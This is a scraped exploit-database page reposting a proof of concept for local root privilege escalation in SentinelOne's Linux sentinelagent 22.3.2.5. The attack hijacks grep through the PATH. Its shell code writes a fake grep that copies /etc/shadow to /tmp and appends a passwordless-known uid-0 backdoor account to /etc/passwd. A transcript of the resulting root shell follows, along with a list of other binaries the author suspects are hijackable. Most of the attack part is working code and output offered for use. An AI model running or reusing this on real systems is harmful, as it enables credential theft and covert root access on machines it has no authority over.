---
title: SentinelOne sentinelagent 22.3.2.5 Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2022120014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-08
fetch_date: 2025-10-04T00:52:19.882724
---

# SentinelOne sentinelagent 22.3.2.5 Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SentinelOne sentinelagent 22.3.2.5 Privilege Escalation** **2022.12.07**  Credit:  **[ouch\_this\_hurts](https://cxsecurity.com/author/ouch_this_hurts/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-427](https://cxsecurity.com/cwe/CWE-427 "Click to see CWE-427")  [CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

Exploit Title: SentinelOne sentinelagent (linux) root Privilege Escalation zero day vulnerability
Date: 12/06/2022
Exploit Author: ouch\_this\_hurts
Vendor Homepage: https://www.sentinelone.com/
Software Link: https://assets.sentinelone.com/prod/s1-linux-agent-datas
Version: 22.3.2.5
Tested on: Ubuntu 22.04.x
CVE: NA
Not enough AI in the world can help you write secure software it seems? The vendor doesnt make reporting vulnerabilities easy, so to exploit-db it goes :)
Protips:
- If I Google you, and I cannot find an easy way to report the vulnerability, I'm not going to bother.
- If you require me to use HackerOne, I'm not going to bother.
- If you dont have a security.txt, how do you expect me to contact you?
Get `root` on a system with `sentinelagent<=22.3.2.5` with one simple trick:
Override `grep` in the `PATH` with your malicious code. Reboot. pwnd. Nice!
PoC below:
1. Find the systems "earliest" `PATH`, or just override it to whatever you want in `/etc/environment` with some other staged exploit.
2. Create the following `grep` file in that directory and make sure its executable:
```shell
cat << SENTINELOOPS > /usr/local/bin/grep
#!/bin/bash
# I think I'll have the passwds pl0x
cat /etc/shadow > /tmp/etc\_shadow
# password is password :)
echo 'sentinel\_oops:\$1\$user1\$WuzQ29wbcMN09VLW7X0/q1:0:0::/root:/bin/sh' >> /etc/passwd
SENTINELOOPS
chmod +x /usr/local/bin/grep
```
3. Wait for machine to reboot, login as `sentinel\_oops:password` :)
```
$ su sentinel\_oops
Password:
# whoami
root
```
What actually happened here? On `sentinelagent` start it runs `sh -c "grep...."`.
So there are potentially other ways of privilege escalation via this "agent"?
- `grep` as demonstrated above
- `pgrep` examining the binary appears to be vulnerable
- `xargs` examining the binary appears to be vulnerable
- `cat` examining the binary appears to be vulnerable
- `pgrep` examining the binary appears to be vulnerable
- `ldd` examining the binary appears to be vulnerable
- `lsmod` examining the binary appears to be vulnerable
- `mksh` examining the binary appears to be vulnerable
- `awk` examining the binary appears to be vulnerable
[CWE-427](https://cwe.mitre.org/data/definitions/427.html) and [how to write secure software](https://youtu.be/RfiQYRn7fBg?t=16)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top